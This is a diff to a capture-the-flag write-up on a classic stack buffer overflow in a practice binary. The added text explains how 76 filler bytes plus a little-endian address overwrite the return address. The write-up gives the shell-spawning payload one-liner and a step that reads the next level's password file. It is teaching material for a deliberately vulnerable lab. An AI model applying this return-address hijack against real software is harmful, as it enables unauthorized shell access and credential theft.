@@ -42,23 +42,61 @@ void run(void)
 [Buffer: 76 bytes] [Saved EBP: 4 bytes] [Return Address: 4 bytes]
 ```
 
-## 💣 Exploit
+## 🎯 How the Exploit Works
 
-### Finding the Address
-```bash
-objdump -d level1 | grep "<run>"
-# Output: 08048444 <run>
+### Normal Execution
+When `main()` is called normally:
+1. The **return address** (where to go after main finishes) is pushed onto the stack
+2. The 76-byte buffer is allocated on the stack
+3. `gets()` reads user input into the buffer
+4. When `main()` executes `ret`, it pops the return address from the stack into **EIP** (instruction pointer) and jumps back to the caller
+
+### The Attack
+Our malicious input does the following:
+1. **Fill the buffer**: Send 76 bytes of 'A' (0x41) to completely fill the buffer and overwrite the saved EBP
+2. **Overwrite return address**: Send 4 more bytes (`\x44\x84\x04\x08`) that overwrite the return address on the stack
+3. **Hijack execution**: When `main()` executes `ret`, it does `EIP = [ESP]` where ESP points to our corrupted return address (`0x08048444`)
+4. **Get shell**: CPU jumps to `run()` at `0x08048444`, which executes `system("/bin/sh")`, spawning a shell with level2 privileges
+
+**Key insight:** The `ret` instruction automatically loads `[ESP]` into EIP. By controlling what's on the stack at ESP, we control where the program jumps!
+
+### Memory State After Overflow
+
+```
+Stack Memory:                      CPU Registers:
+─────────────────────────────────  EIP = 0x08048495 (at 'ret')
+0xbffff7fc: 0x08048444 ← Hijacked! ESP = 0xbffff7fc ← Points here!
+0xbffff7f8: 0x41414141 ← 'AAAA'    EBP = 0x41414141 (corrupted)
+0xbffff7f4: 0x41414141 ← 'AAAA'
+...
+0xbffff7ac: 0x41414141 ← Buffer
+─────────────────────────────────
+
+When 'ret' executes:
+  ret → EIP = [ESP] = 0x08048444 → Jump to run()! 🎉
 ```
 
+### Execution Flow
+
+**Normal:** `main() → ret → EIP = 0x08048xxx → back to caller`
+
+**Exploited:** `main() → ret → EIP = 0x08048444 → run() → shell! 🚩`
+
+## 💣 Exploit
+
 ### Crafting the Payload
+
 ```bash
 (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
 ```
 
 **Breakdown**:
 - `"A"*76` → Fill the buffer completely
-- `"\x44\x84\x04\x08"` → Overwrite return address with `run()` (little-endian)
+- `"\x44\x84\x04\x08"` → Overwrite return address with `run()` address `0x08048444` in little-endian format
 - `cat` → Keep stdin open to interact with the spawned shell
+
+**Little-endian explanation**:
+x86 processors store multi-byte values with the **least significant byte first**. The address `0x08048444` is stored in memory as bytes `44 84 04 08` (reversed). When we write `\x44\x84\x04\x08`, the CPU reads it back as `0x08048444`.
 
 ### Getting the Flag
 ```bash
@@ -87,26 +125,6 @@ cat /home/user/level2/.pass
 > 💡 **Pro Tip**: Use `(python -c '...'; cat)` pattern for any exploit that spawns an interactive shell!
 
 > ⚠️ **Security Note**: This is why modern systems have stack canaries, ASLR, and DEP!
-
-## 📚 References & Further Reading
-
-### Academic Papers & Tutorials
-- **[Smashing the Stack for Fun and Profit](https://phrack.org/issues/49/14.html)** (1996) - Aleph One (Phrack Magazine)  
-  The legendary paper that introduced stack buffer overflow exploitation to the masses
-
-### Security Resources
-- **[OWASP Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)**  
-  Comprehensive guide to buffer overflow vulnerabilities and prevention
-
-- **[Wikipedia: Buffer Overflow](https://en.wikipedia.org/wiki/Buffer_overflow)**  
-  Technical description, exploitation techniques, and history including the Morris Worm
-
-- **[Wikipedia: Stack Buffer Overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow)**  
-  Detailed explanation of stack-based buffer overflow attacks
-
-### Historical Context
-- **Morris Worm (1988)**: First major buffer overflow exploit using `gets()` in fingerd
-- **Unsafe Functions**: `gets()`, `strcpy()`, `scanf()` - all deprecated due to lack of bounds checking
 
 ## 🎉 Victory!
 
